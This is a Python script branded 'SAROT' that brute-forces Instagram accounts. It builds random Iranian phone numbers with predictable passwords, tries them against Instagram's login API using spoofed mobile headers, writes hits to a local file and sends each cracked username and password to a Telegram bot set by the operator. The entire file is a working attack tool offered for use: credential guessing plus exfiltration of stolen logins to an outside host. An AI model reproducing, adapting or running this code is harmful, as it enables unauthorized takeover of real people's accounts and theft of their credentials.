#@B_5_U
try:
	import  os , sys , random, requests , time , json , secrets,uuid
	import subprocess
	import pyfiglet
	from bs4 import BeautifulSoup as sarot
	from uuid import uuid4
	from time import sleep 
	import webbrowser
except ImportError as sarot:
	os.system('pip install requests')
	os.system('pip install bs4')
	os.system('clear')
#--------------------------------------------»
S = "\033[1;91m"  #احمر
B = "\033[1;90m"  #اسود فاتح
C = "\033[1;97m"  #ابيض
E = "\033[1;92m"  #اخضر
H = "\033[1;93m"  #اصفر
K = "\033[1;94m"  #ازرق
L = "\033[1;95m"  #ارجواني
M = "("
M = ")"
#--------------------------------------------»


#-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-#
log = pyfiglet.figlet_format("SAROT")
print(E+log)
print(H+'@B_5_U')
print(E+'⌯'*33)
print('\n\n')
ID = input(H+' - ID '+E+'› › '+S)
print('\n')
tok = input(H+' - TOKEN '+E+'› › '+S)
print('\n')
sarot = input(H+' - Enter a number'+E+'‹1› '+S)
os.system('clear')
print(E+'py : @B_5_U\n'+L+'wait....')
#-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*#

sr = 0
bd = 0
ht = 0
ib = 0

start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=wait...🦉").json()
id_msg = start_msg['result']['message_id']        
t = time.localtime()
current_time = time.strftime('%H:%M:%S', t)
w = 'https://pastebin.com/raw/mpWBGQKF'
rss = requests.get(w).text
if '' in rss:
            sleep(0.1)
            r = requests.Session()
            user = '0123456789'         
if sarot == '1':  
            while True:
                us = str(''.join((random.choice(user) for i in range(8))))                
                username = '+9891' + us
                password = '091' + us
                url = 'https://www.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid,  'password':password,  'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:                  
                    print (E+'USER : ' +username+ '  PASS : '+password)
                    ht += 1                    
                    tlg = (f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= ▂▃▅▇█▓▒☬𝙽𝚎𝚠 𝙰𝚌𝚌☬▒▓█▇▅▃▂

➛⌯ 𝚄𝚜𝚎𝚛 : {username}

➛⌯ 𝙿𝚊𝚜𝚜 : {password}

- py ↝ : @B_5_U 🦉 | ✓''' )
                    i = requests.post(tlg)
                    with open('insta-hits.txt', 'a') as (HACKED):
                        HACKED.write('{}:{}\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    ib += 1  
                    print (H+'USER : ' +username+ ' PASS : '+password)
                    sr+=1
                    sr1 = (f"""https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= ▂▃▅▇█▓☬𝙽𝚎𝚠 𝙰𝚌𝚌☬▓█▇▅▃▂

➛⌯ 𝚄𝚜𝚎𝚛 : {username}

➛⌯ 𝙿𝚊𝚜𝚜 : {password}

- py ↝ : @B_5_U 🦉 | ✓""")
                    i = requests.post(sr1)
                else:
                    requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= ⌯ 𝚆𝚊𝚒𝚝 𝙷𝚊𝚌𝚔 \n-  -  -  -  -  -  -  -  -  -  - \n ⌯ 𝙷𝚊𝚌𝚔 «{ht}» \n ⌯ 𝚋𝚊𝚍 «{bd}» \n ⌯ 𝚜𝚎𝚌 «{sr}» \n-  -  -  -  -  -  -  -  -  -  - \n ⌯ py : @B_5_U 🦉")               
                    print (S+'USER : ' +username+ 'PASS : '+password)
                    bd+=1 